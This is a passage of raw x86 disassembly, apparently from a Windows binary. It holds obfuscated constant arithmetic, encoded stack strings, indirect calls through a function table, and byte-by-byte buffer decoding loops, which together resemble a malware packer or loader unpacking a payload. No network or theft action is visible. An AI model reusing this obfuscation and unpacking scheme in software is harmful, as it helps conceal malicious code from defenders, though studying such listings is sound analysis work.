  41d759:	mov    ecx,DWORD PTR [ebp-0x14]
  41d75c:	xor    ecx,ebx
  41d75e:	add    ecx,esi
  41d760:	cmp    ecx,eax
  41d762:	je     0x41da3f
  41d768:	mov    eax,DWORD PTR [ebp+0x8]
  41d76b:	mov    eax,DWORD PTR [eax+0x194]
  41d771:	mov    ecx,DWORD PTR [eax]
  41d773:	mov    eax,DWORD PTR [ebp+0x8]
  41d776:	mov    eax,DWORD PTR [eax+0x194]
  41d77c:	mov    eax,DWORD PTR [eax]
  41d77e:	add    eax,DWORD PTR [ecx+0x3c]
  41d781:	mov    ecx,DWORD PTR [ebp+0x8]
  41d784:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41d78a:	lea    edx,[ebp-0xc4]
  41d790:	push   edx
  41d791:	mov    edx,DWORD PTR [ebp+0x8]
  41d794:	mov    edx,DWORD PTR [edx+0x18c]
  41d79a:	mov    edx,DWORD PTR [edx]
  41d79c:	add    edx,DWORD PTR [eax+0x88]
  41d7a2:	push   0x4
  41d7a4:	push   DWORD PTR [eax+0x8c]
  41d7aa:	push   edx
  41d7ab:	call   DWORD PTR [ecx+0x1c]
  41d7ae:	push   DWORD PTR [ebp+0x8]
  41d7b1:	mov    edi,DWORD PTR [ebp+0x8]
  41d7b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d7b7:	mov    edx,DWORD PTR [eax+0x1b8]
  41d7bd:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41d7c4:	mov    DWORD PTR [ebp-0x64],0x50c011f
  41d7cb:	mov    WORD PTR [ebp-0x60],0x7c3d
  41d7d1:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  41d7db:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41d7e5:	mov    DWORD PTR [ebp-0x88],0x221d040c
  41d7ef:	mov    DWORD PTR [ebp-0x84],0xe190109
  41d7f9:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  41d800:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41d807:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  41d80e:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41d815:	mov    DWORD PTR [ebp-0x70],0xe190109
  41d81c:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41d823:	call   0x41fafc
  41d828:	push   eax
  41d829:	mov    eax,DWORD PTR [ebp+0x8]
  41d82c:	mov    eax,DWORD PTR [eax+0x1a8]
  41d832:	push   DWORD PTR [eax]
  41d834:	call   0x41f79d
  41d839:	test   eax,eax
  41d83b:	jne    0x41d88d
  41d83d:	mov    eax,DWORD PTR [ebp+0x8]
  41d840:	mov    eax,DWORD PTR [eax+0x1d8]
  41d846:	mov    edi,DWORD PTR [ebp+0x8]
  41d849:	add    eax,0x4
  41d84c:	mov    DWORD PTR [ebp-0x24],eax
  41d84f:	mov    eax,DWORD PTR [ebp+0x8]
  41d852:	mov    edx,DWORD PTR [eax+0x1b8]
  41d858:	call   0x41fafc
  41d85d:	push   eax
  41d85e:	mov    eax,DWORD PTR [ebp-0x24]
  41d861:	call   DWORD PTR [eax]
  41d863:	test   eax,eax
  41d865:	jne    0x41d88d
  41d867:	mov    eax,DWORD PTR [ebp+0x8]
  41d86a:	mov    eax,DWORD PTR [eax+0x1d8]
  41d870:	mov    edi,DWORD PTR [ebp+0x8]
  41d873:	add    eax,0x10
  41d876:	mov    DWORD PTR [ebp-0x24],eax
  41d879:	mov    eax,DWORD PTR [ebp+0x8]
  41d87c:	mov    edx,DWORD PTR [eax+0x1b8]
  41d882:	call   0x41fafc
  41d887:	push   eax
  41d888:	mov    eax,DWORD PTR [ebp-0x24]
  41d88b:	call   DWORD PTR [eax]
  41d88d:	mov    eax,DWORD PTR [ebp-0x14]
  41d890:	mov    ecx,DWORD PTR [ebp-0x28]
  41d893:	xor    eax,ebx
  41d895:	add    eax,esi
  41d897:	cmp    eax,ecx
  41d899:	je     0x41da18
  41d89f:	mov    eax,DWORD PTR [ebp-0x18]
  41d8a2:	xor    eax,ebx
  41d8a4:	mov    ecx,0xffcd8d1e
  41d8a9:	sub    ecx,eax
  41d8ab:	add    ecx,DWORD PTR [ebp-0x28]
  41d8ae:	mov    eax,DWORD PTR [ebp-0x8]
  41d8b1:	cmp    eax,ecx
  41d8b3:	ja     0x41da18
  41d8b9:	mov    DWORD PTR [ebp-0x20],0x0
  41d8c0:	push   DWORD PTR [ebp+0x8]
  41d8c3:	mov    edi,DWORD PTR [ebp+0x8]
  41d8c6:	mov    eax,DWORD PTR [ebp+0x8]
  41d8c9:	mov    edx,DWORD PTR [eax+0x1b4]
  41d8cf:	call   0x41fafc
  41d8d4:	push   eax
  41d8d5:	mov    eax,DWORD PTR [ebp+0x8]
  41d8d8:	mov    eax,DWORD PTR [eax+0x1a8]
  41d8de:	push   DWORD PTR [eax]
  41d8e0:	call   0x41f79d
  41d8e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d8e8:	mov    ecx,DWORD PTR [ecx+0x19c]
  41d8ee:	mov    DWORD PTR [ecx],eax
  41d8f0:	mov    eax,DWORD PTR [ebp+0x8]
  41d8f3:	mov    edi,DWORD PTR [eax+0x1d8]
  41d8f9:	mov    esi,DWORD PTR [ebp+0x8]
  41d8fc:	xor    eax,eax
  41d8fe:	lea    edx,[ebp-0x7c]
  41d901:	call   0x41fb32
  41d906:	push   eax
  41d907:	mov    eax,DWORD PTR [ebp+0x8]
  41d90a:	mov    eax,DWORD PTR [eax+0x19c]
  41d910:	push   DWORD PTR [eax]
  41d912:	call   DWORD PTR [edi+0x8]
  41d915:	mov    DWORD PTR [ebp-0x24],eax
  41d918:	mov    eax,DWORD PTR [ebp+0x8]
  41d91b:	mov    edi,DWORD PTR [eax+0x1d8]
  41d921:	mov    esi,DWORD PTR [ebp+0x8]
  41d924:	xor    eax,eax
  41d926:	lea    edx,[ebp-0x90]
  41d92c:	call   0x41fb32
  41d931:	push   eax
  41d932:	mov    eax,DWORD PTR [ebp+0x8]
  41d935:	mov    eax,DWORD PTR [eax+0x19c]
  41d93b:	push   DWORD PTR [eax]
  41d93d:	call   DWORD PTR [edi+0x8]
  41d940:	and    DWORD PTR [ebp-0x1c],0x0
  41d944:	mov    eax,DWORD PTR [ebp-0x1c]
  41d947:	and    eax,0x7
  41d94a:	add    eax,0x31
  41d94d:	push   eax
  41d94e:	call   DWORD PTR [ebp-0x24]
  41d951:	test   eax,eax
  41d953:	jne    0x41d95a
  41d955:	and    DWORD PTR [ebp-0x10],eax
  41d958:	jmp    0x41d982
  41d95a:	mov    eax,DWORD PTR [ebp+0x8]
  41d95d:	mov    edi,DWORD PTR [eax+0x1d8]
  41d963:	mov    esi,DWORD PTR [ebp+0x8]
  41d966:	xor    eax,eax
  41d968:	lea    edx,[ebp-0x68]
  41d96b:	call   0x41fb32
  41d970:	push   eax
  41d971:	mov    eax,DWORD PTR [ebp+0x8]
  41d974:	mov    eax,DWORD PTR [eax+0x198]
  41d97a:	push   DWORD PTR [eax]
  41d97c:	call   DWORD PTR [edi+0x8]
  41d97f:	mov    DWORD PTR [ebp-0x10],eax
  41d982:	inc    DWORD PTR [ebp-0x1c]
  41d985:	cmp    DWORD PTR [ebp-0x1c],0x10
  41d989:	jb     0x41d944
  41d98b:	mov    eax,DWORD PTR [ebp-0x18]
  41d98e:	mov    esi,DWORD PTR [ebp+0x8]
  41d991:	xor    eax,ebx
  41d993:	mov    edi,0x3272e2
  41d998:	add    eax,edi
  41d99a:	lea    edx,[ebp-0xe4]
  41d9a0:	call   0x41fb32
  41d9a5:	push   eax
  41d9a6:	mov    eax,DWORD PTR [ebp-0x14]
  41d9a9:	mov    esi,DWORD PTR [ebp+0x8]
  41d9ac:	xor    eax,ebx
  41d9ae:	add    eax,edi
  41d9b0:	lea    edx,[ebp-0x104]
  41d9b6:	call   0x41fb32
  41d9bb:	push   eax
  41d9bc:	call   DWORD PTR [ebp-0x10]
  41d9bf:	mov    ecx,DWORD PTR [ebp-0x14]
  41d9c2:	xor    ecx,ebx
  41d9c4:	add    ecx,edi
  41d9c6:	cmp    ecx,eax
  41d9c8:	jne    0x41d9d1
  41d9ca:	mov    DWORD PTR [ebp-0x20],0x1
  41d9d1:	mov    eax,DWORD PTR [ebp-0x18]
  41d9d4:	mov    ecx,DWORD PTR [ebp-0x8]
  41d9d7:	xor    eax,ebx
  41d9d9:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9e0:	mov    DWORD PTR [ebp-0x8],eax
  41d9e3:	mov    eax,DWORD PTR [ebp-0x20]
  41d9e6:	test   eax,eax
  41d9e8:	je     0x41d9fc
  41d9ea:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ed:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9f0:	xor    eax,ebx
  41d9f2:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9f9:	mov    DWORD PTR [ebp-0x38],eax
  41d9fc:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ff:	xor    eax,ebx
  41da01:	mov    ecx,0xffcd8d1e
  41da06:	sub    ecx,eax
  41da08:	add    ecx,DWORD PTR [ebp-0x28]
  41da0b:	mov    eax,DWORD PTR [ebp-0x8]
  41da0e:	cmp    eax,ecx
  41da10:	jbe    0x41d8b9
  41da16:	mov    esi,edi
  41da18:	mov    eax,DWORD PTR [ebp-0x38]
  41da1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41da1e:	cmp    ecx,eax
  41da20:	jne    0x41da33
  41da22:	push   DWORD PTR [ebp+0x8]
  41da25:	lea    eax,[ebp-0x3c]
  41da28:	push   eax
  41da29:	call   0x4205aa
  41da2e:	mov    DWORD PTR [ebp-0x2c],eax
  41da31:	jmp    0x41da3f
  41da33:	mov    eax,DWORD PTR [ebp-0x2c]
  41da36:	mov    ecx,DWORD PTR [ebp-0x18]
  41da39:	xor    ecx,ebx
  41da3b:	add    ecx,esi
  41da3d:	xor    DWORD PTR [eax],ecx
  41da3f:	mov    eax,DWORD PTR [ebp-0x14]
  41da42:	mov    ecx,DWORD PTR [ebp-0x2c]
  41da45:	xor    eax,ebx
  41da47:	add    eax,esi
  41da49:	cmp    eax,ecx
  41da4b:	je     0x41e1c5
  41da51:	mov    eax,DWORD PTR [ebp-0x14]
  41da54:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da57:	xor    eax,ebx
  41da59:	add    eax,esi
  41da5b:	cmp    eax,ecx
  41da5d:	je     0x41e1c5
  41da63:	mov    eax,DWORD PTR [ebp-0x14]
  41da66:	xor    eax,ebx
  41da68:	add    eax,esi
  41da6a:	jmp    0x41da88
  41da6c:	mov    edi,DWORD PTR [ebp-0x2c]
  41da6f:	mov    cl,al
  41da71:	and    cl,0x1f
  41da74:	or     dl,0xff
  41da77:	sub    dl,cl
  41da79:	add    BYTE PTR [edi+eax*1],dl
  41da7c:	mov    ecx,DWORD PTR [ebp-0x18]
  41da7f:	xor    ecx,ebx
  41da81:	lea    eax,[eax+ecx*1+0x3272e2]
  41da88:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da8b:	cmp    eax,ecx
  41da8d:	jb     0x41da6c
  41da8f:	mov    eax,DWORD PTR [ebp-0x3c]
  41da92:	mov    DWORD PTR [ebp-0x28],eax
  41da95:	mov    eax,DWORD PTR [ebp-0x2c]
  41da98:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41da9f:	mov    DWORD PTR [ebp-0xbc],eax
  41daa5:	mov    edi,0xf89c8584
  41daaa:	mov    DWORD PTR [ebp-0x30],edi
  41daad:	mov    eax,DWORD PTR [ebp-0x38]
  41dab0:	xor    eax,ebx
  41dab2:	add    eax,esi
  41dab4:	mov    DWORD PTR [ebp-0xc],eax
  41dab7:	mov    eax,DWORD PTR [ebp-0x38]
  41daba:	xor    eax,ebx
  41dabc:	add    eax,esi
  41dabe:	mov    DWORD PTR [ebp-0x8],eax
  41dac1:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41dac8:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41dacf:	mov    eax,DWORD PTR [ebp-0x38]
  41dad2:	mov    ecx,DWORD PTR [ebp-0x28]
  41dad5:	xor    eax,ebx
  41dad7:	add    eax,esi
  41dad9:	cmp    ecx,eax
  41dadb:	je     0x41dcda
  41dae1:	jmp    0x41dcb6
  41dae6:	mov    ecx,DWORD PTR [ebp-0xc]
  41dae9:	mov    eax,DWORD PTR [ebp-0x28]
  41daec:	sub    eax,ecx
  41daee:	mov    ecx,DWORD PTR [ebp-0x48]
  41daf1:	xor    ecx,ebx
  41daf3:	add    ecx,esi
  41daf5:	xor    edx,edx
  41daf7:	div    ecx
  41daf9:	mov    DWORD PTR [ebp-0x8],eax
  41dafc:	mov    eax,DWORD PTR [ebp-0x54]
  41daff:	mov    ecx,DWORD PTR [ebp-0x8]
  41db02:	xor    eax,ebx
  41db04:	add    eax,esi
  41db06:	cmp    ecx,eax
  41db08:	jbe    0x41db14
  41db0a:	mov    eax,DWORD PTR [ebp-0x54]
  41db0d:	xor    eax,ebx
  41db0f:	add    eax,esi
  41db11:	mov    DWORD PTR [ebp-0x8],eax
  41db14:	mov    eax,DWORD PTR [ebp-0x48]
  41db17:	mov    ecx,DWORD PTR [ebp-0x8]
  41db1a:	xor    eax,ebx
  41db1c:	add    eax,esi
  41db1e:	imul   eax,ecx
  41db21:	mov    DWORD PTR [ebp-0x8],eax
  41db24:	mov    eax,DWORD PTR [ebp-0x38]
  41db27:	mov    ecx,DWORD PTR [ebp-0x8]
  41db2a:	xor    eax,ebx
  41db2c:	add    eax,esi
  41db2e:	cmp    ecx,eax
  41db30:	je     0x41dca4
  41db36:	mov    eax,DWORD PTR [ebp-0x8]
  41db39:	mov    DWORD PTR [ebp-0x10],eax
  41db3c:	mov    eax,DWORD PTR [ebp-0xc]
  41db3f:	add    eax,DWORD PTR [ebp-0xbc]
  41db45:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  41db4c:	mov    DWORD PTR [ebp-0x20],edi
  41db4f:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41db59:	mov    DWORD PTR [ebp-0x8],eax
  41db5c:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41db63:	mov    DWORD PTR [ebp-0x1c],edi
  41db66:	mov    eax,DWORD PTR [ebp-0x24]
  41db69:	xor    eax,ebx
  41db6b:	add    eax,esi
  41db6d:	jmp    0x41dc63
  41db72:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41db7c:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  41db86:	mov    eax,DWORD PTR [ebp-0x1c]
  41db89:	mov    ecx,DWORD PTR [ebp-0x44]
  41db8c:	xor    eax,ebx
  41db8e:	add    eax,esi
  41db90:	imul   eax,ecx
  41db93:	mov    ecx,DWORD PTR [ebp-0x8]
  41db96:	mov    al,BYTE PTR [eax+ecx*1]
  41db99:	mov    BYTE PTR [ebp-0x2],al
  41db9c:	mov    eax,DWORD PTR [ebp-0x1c]
  41db9f:	mov    ecx,DWORD PTR [ebp-0x44]
  41dba2:	xor    eax,ebx
  41dba4:	add    eax,esi
  41dba6:	imul   eax,ecx
  41dba9:	mov    ecx,DWORD PTR [ebp-0xa8]
  41dbaf:	xor    ecx,ebx
  41dbb1:	add    eax,ecx
  41dbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbb6:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dbbe:	mov    ecx,DWORD PTR [ebp-0xb0]
  41dbc4:	xor    ecx,ebx
  41dbc6:	lea    eax,[ecx+eax*1+0x3272e2]
  41dbcd:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dbd1:	xor    ecx,eax
  41dbd3:	mov    BYTE PTR [ebp-0x2],cl
  41dbd6:	mov    al,BYTE PTR [ebp-0x2]
  41dbd9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dbdc:	mov    edx,DWORD PTR [ebp-0x44]
  41dbdf:	xor    ecx,ebx
  41dbe1:	add    ecx,esi
  41dbe3:	imul   ecx,edx
  41dbe6:	mov    edx,DWORD PTR [ebp-0x8]
  41dbe9:	mov    BYTE PTR [ecx+edx*1],al
  41dbec:	mov    eax,DWORD PTR [ebp-0x1c]
  41dbef:	mov    ecx,DWORD PTR [ebp-0x44]
  41dbf2:	xor    eax,ebx
  41dbf4:	add    eax,esi
  41dbf6:	imul   eax,ecx
  41dbf9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbfc:	mov    al,BYTE PTR [eax+ecx*1]
  41dbff:	mov    BYTE PTR [ebp-0x2],al
  41dc02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc05:	mov    ecx,DWORD PTR [ebp-0x44]
  41dc08:	xor    eax,ebx
  41dc0a:	add    eax,esi
  41dc0c:	imul   eax,ecx
  41dc0f:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc12:	xor    ecx,ebx
  41dc14:	add    eax,ecx
  41dc16:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc19:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dc21:	mov    ecx,DWORD PTR [ebp-0xb8]
  41dc27:	xor    ecx,ebx
  41dc29:	lea    eax,[ecx+eax*1+0x3272e2]
  41dc30:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dc34:	xor    ecx,eax
  41dc36:	mov    BYTE PTR [ebp-0x2],cl
  41dc39:	mov    al,BYTE PTR [ebp-0x2]
  41dc3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc3f:	mov    edx,DWORD PTR [ebp-0x44]
  41dc42:	xor    ecx,ebx
  41dc44:	add    ecx,esi
  41dc46:	imul   ecx,edx
  41dc49:	mov    edx,DWORD PTR [ebp-0x8]
  41dc4c:	mov    BYTE PTR [ecx+edx*1],al
  41dc4f:	mov    eax,DWORD PTR [ebp-0x34]
  41dc52:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc55:	xor    eax,ebx
  41dc57:	xor    ecx,ebx
  41dc59:	add    eax,esi
  41dc5b:	add    ecx,esi
  41dc5d:	imul   eax,ecx
  41dc60:	add    eax,DWORD PTR [ebp-0x44]
  41dc63:	mov    DWORD PTR [ebp-0x44],eax
  41dc66:	mov    eax,DWORD PTR [ebp-0x44]
  41dc69:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc6c:	cmp    ecx,eax
  41dc6e:	jb     0x41db72
  41dc74:	mov    eax,DWORD PTR [ebp-0x20]
  41dc77:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7a:	xor    eax,ebx
  41dc7c:	add    eax,esi
  41dc7e:	imul   eax,ecx
  41dc81:	mov    ecx,DWORD PTR [ebp-0x24]
  41dc84:	xor    ecx,ebx
  41dc86:	add    ecx,esi
  41dc88:	or     eax,ecx
  41dc8a:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc8d:	xor    ecx,ebx
  41dc8f:	add    eax,ecx
  41dc91:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc94:	xor    ecx,ebx
  41dc96:	add    eax,ecx
  41dc98:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc9b:	lea    eax,[eax+ecx*1+0x64e5c4]
  41dca2:	jmp    0x41dcb3
  41dca4:	mov    eax,DWORD PTR [ebp-0x30]
  41dca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcaa:	xor    eax,ebx
  41dcac:	lea    eax,[eax+ecx*1+0x3272e2]
  41dcb3:	mov    DWORD PTR [ebp-0xc],eax
  41dcb6:	mov    eax,DWORD PTR [ebp-0x30]
  41dcb9:	xor    eax,ebx
  41dcbb:	mov    ecx,0xffcd8d1e
  41dcc0:	sub    ecx,eax
  41dcc2:	add    ecx,DWORD PTR [ebp-0x28]
  41dcc5:	mov    eax,DWORD PTR [ebp-0x30]
  41dcc8:	mov    edx,DWORD PTR [ebp-0xc]
  41dccb:	xor    eax,ebx
  41dccd:	add    eax,esi
  41dccf:	imul   eax,edx
  41dcd2:	cmp    eax,ecx
  41dcd4:	jbe    0x41dae6
  41dcda:	mov    eax,DWORD PTR [ebp-0x14]
  41dcdd:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    edx,DWORD PTR [ebp-0x4c]
  41dce6:	mov    eax,DWORD PTR [eax+0x1d8]
  41dcec:	xor    edx,ebx
  41dcee:	add    edx,esi
  41dcf0:	push   edx
  41dcf1:	mov    edx,DWORD PTR [ebp-0x40]
  41dcf4:	xor    edx,ebx
  41dcf6:	add    edx,esi
  41dcf8:	push   edx
  41dcf9:	push   ecx
  41dcfa:	mov    DWORD PTR [ebp-0x34],ecx
  41dcfd:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd00:	xor    ecx,ebx
  41dd02:	add    ecx,esi
  41dd04:	push   ecx
  41dd05:	call   DWORD PTR [eax+0x14]
  41dd08:	mov    edi,eax
  41dd0a:	mov    eax,DWORD PTR [ebp-0x14]
  41dd0d:	xor    eax,ebx
  41dd0f:	add    eax,esi
  41dd11:	cmp    eax,edi
  41dd13:	je     0x41dd6e
  41dd15:	mov    eax,DWORD PTR [ebp-0x14]
  41dd18:	jmp    0x41dd3b
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dd1d:	xor    eax,ebx
  41dd1f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41dd26:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  41dd2d:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd30:	xor    ecx,ebx
  41dd32:	lea    eax,[ecx+eax*1+0x3272e2]
  41dd39:	xor    eax,ebx
  41dd3b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dd3e:	sub    ecx,esi
  41dd40:	xor    ecx,ebx
  41dd42:	cmp    eax,ecx
  41dd44:	jne    0x41dd1a
  41dd46:	mov    eax,DWORD PTR [ebp+0x8]
  41dd49:	mov    ecx,DWORD PTR [ebp-0x50]
  41dd4c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dd52:	xor    ecx,ebx
  41dd54:	add    ecx,esi
  41dd56:	push   ecx
  41dd57:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd5a:	xor    ecx,ebx
  41dd5c:	add    ecx,esi
  41dd5e:	push   ecx
  41dd5f:	push   DWORD PTR [ebp-0x2c]
  41dd62:	call   DWORD PTR [eax+0x18]
  41dd65:	mov    eax,DWORD PTR [ebp-0x34]
  41dd68:	mov    DWORD PTR [ebp-0x2c],edi
  41dd6b:	mov    DWORD PTR [ebp-0x3c],eax
  41dd6e:	mov    eax,DWORD PTR [ebp-0x2c]
  41dd71:	mov    DWORD PTR [ebp-0x10],eax
  41dd74:	mov    eax,DWORD PTR [ebp-0x18]
  41dd77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd7a:	xor    eax,ebx
  41dd7c:	add    eax,esi
  41dd7e:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  41dd85:	mov    DWORD PTR [ebp-0x58],0x27143f14
  41dd8c:	jmp    0x41ddbf
  41dd8e:	mov    edx,DWORD PTR [ebp-0x10]
  41dd91:	mov    edi,ecx
  41dd93:	xor    edi,ebx
  41dd95:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  41dd9c:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41dda4:	xor    cl,0x74
  41dda7:	sub    cl,0x8
  41ddaa:	movzx  ecx,cl
  41ddad:	cmp    edx,ecx
  41ddaf:	jne    0x41ddc9
  41ddb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41ddb4:	xor    ecx,ebx
  41ddb6:	lea    ecx,[ecx+edi*1+0x3272e2]
  41ddbd:	xor    ecx,ebx
  41ddbf:	cmp    ecx,0xf89c85bd
  41ddc5:	jne    0x41dd8e
  41ddc7:	jmp    0x41ddd0
  41ddc9:	mov    eax,DWORD PTR [ebp-0x14]
  41ddcc:	xor    eax,ebx
  41ddce:	add    eax,esi
  41ddd0:	mov    ecx,DWORD PTR [ebp-0x14]
  41ddd3:	xor    ecx,ebx
  41ddd5:	add    ecx,esi
  41ddd7:	cmp    ecx,eax
  41ddd9:	je     0x41df4f
  41dddf:	mov    eax,DWORD PTR [ebp-0x10]
  41dde2:	mov    eax,DWORD PTR [eax+0x8]
  41dde5:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41ddec:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41ddf3:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  41ddfa:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41de01:	mov    DWORD PTR [ebp-0x20],eax
  41de04:	mov    eax,DWORD PTR [ebp+0x8]
  41de07:	mov    ecx,DWORD PTR [ebp-0x24]
  41de0a:	xor    ecx,ebx
  41de0c:	add    ecx,esi
  41de0e:	push   ecx
  41de0f:	mov    ecx,DWORD PTR [ebp-0x48]
  41de12:	mov    eax,DWORD PTR [eax+0x1d8]
  41de18:	xor    ecx,ebx
  41de1a:	add    ecx,esi
  41de1c:	push   ecx
  41de1d:	mov    ecx,DWORD PTR [ebp-0x40]
  41de20:	xor    ecx,ebx
  41de22:	add    ecx,esi
  41de24:	push   ecx
  41de25:	mov    ecx,DWORD PTR [ebp-0xc]
  41de28:	xor    ecx,ebx
  41de2a:	add    ecx,esi
  41de2c:	push   ecx
  41de2d:	call   DWORD PTR [eax+0x14]
  41de30:	mov    edi,eax
  41de32:	mov    eax,DWORD PTR [ebp+0x8]
  41de35:	mov    ecx,DWORD PTR [ebp-0x24]
  41de38:	mov    eax,DWORD PTR [eax+0x1d8]
  41de3e:	xor    ecx,ebx
  41de40:	add    ecx,esi
  41de42:	push   ecx
  41de43:	mov    ecx,DWORD PTR [ebp-0x48]
  41de46:	xor    ecx,ebx
  41de48:	add    ecx,esi
  41de4a:	push   ecx
  41de4b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de4e:	push   DWORD PTR [ebp-0x20]
  41de51:	xor    ecx,ebx
  41de53:	add    ecx,esi
  41de55:	push   ecx
  41de56:	call   DWORD PTR [eax+0x14]
  41de59:	mov    ecx,DWORD PTR [ebp-0xc]
  41de5c:	xor    ecx,ebx
  41de5e:	add    ecx,esi
  41de60:	mov    DWORD PTR [ebp-0x24],eax
  41de63:	cmp    ecx,edi
  41de65:	je     0x41e1f2
  41de6b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de6e:	xor    ecx,ebx
  41de70:	add    ecx,esi
  41de72:	cmp    ecx,eax
  41de74:	je     0x41e1f2
  41de7a:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  41de81:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41de88:	mov    ecx,DWORD PTR [ebp-0x40]
  41de8b:	xor    cl,0x9b
  41de8e:	sub    cl,0x1e
  41de91:	mov    BYTE PTR [edi],cl
  41de93:	mov    ecx,DWORD PTR [ebp-0xc]
  41de96:	xor    cl,0x9b
  41de99:	sub    cl,0x1e
  41de9c:	mov    BYTE PTR [edi+0x1],cl
  41de9f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41dea2:	xor    cl,0x9b
  41dea5:	sub    cl,0x1e
  41dea8:	mov    BYTE PTR [edi+0x2],cl
  41deab:	and    DWORD PTR [ebp-0xb4],0x0
  41deb2:	and    DWORD PTR [ebp-0xa4],0x0
  41deb9:	lea    ecx,[ebp-0xa4]
  41debf:	push   ecx
  41dec0:	push   DWORD PTR [ebp-0x20]
  41dec3:	push   eax
  41dec4:	lea    eax,[ebp-0xb4]
  41deca:	push   eax
  41decb:	mov    eax,DWORD PTR [ebp-0x10]
  41dece:	push   DWORD PTR [eax+0xc]
  41ded1:	mov    eax,DWORD PTR [ebp-0x2c]
  41ded4:	add    eax,0x10
  41ded7:	push   eax
  41ded8:	push   edi
  41ded9:	call   0x41d223
  41dede:	mov    DWORD PTR [ebp-0x40],eax
  41dee1:	mov    eax,DWORD PTR [ebp+0x8]
  41dee4:	mov    ecx,DWORD PTR [ebp-0x50]
  41dee7:	mov    eax,DWORD PTR [eax+0x1d8]
  41deed:	xor    ecx,ebx
  41deef:	add    ecx,esi
  41def1:	push   ecx
  41def2:	mov    ecx,DWORD PTR [ebp-0xc]
  41def5:	xor    ecx,ebx
  41def7:	add    ecx,esi
  41def9:	push   ecx
  41defa:	push   edi
  41defb:	call   DWORD PTR [eax+0x18]
  41defe:	mov    eax,DWORD PTR [ebp-0x40]
  41df01:	add    eax,0xffcd8d1e
  41df06:	xor    eax,ebx
  41df08:	cmp    eax,0xf89c8585
  41df0d:	mov    eax,DWORD PTR [ebp+0x8]
  41df10:	mov    eax,DWORD PTR [eax+0x1d8]
  41df16:	mov    ecx,DWORD PTR [ebp-0x50]
  41df19:	jne    0x41df3c
  41df1b:	xor    ecx,ebx
  41df1d:	add    ecx,esi
  41df1f:	push   ecx
  41df20:	mov    ecx,DWORD PTR [ebp-0xc]
  41df23:	xor    ecx,ebx
  41df25:	add    ecx,esi
  41df27:	push   ecx
  41df28:	push   DWORD PTR [ebp-0x2c]
  41df2b:	call   DWORD PTR [eax+0x18]
  41df2e:	mov    eax,DWORD PTR [ebp-0x24]
  41df31:	mov    DWORD PTR [ebp-0x2c],eax
  41df34:	mov    eax,DWORD PTR [ebp-0x20]
  41df37:	mov    DWORD PTR [ebp-0x3c],eax
  41df3a:	jmp    0x41df4f
  41df3c:	xor    ecx,ebx
  41df3e:	add    ecx,esi
  41df40:	push   ecx
  41df41:	mov    ecx,DWORD PTR [ebp-0xc]
  41df44:	xor    ecx,ebx
  41df46:	add    ecx,esi
  41df48:	push   ecx
  41df49:	push   DWORD PTR [ebp-0x24]
  41df4c:	call   DWORD PTR [eax+0x18]
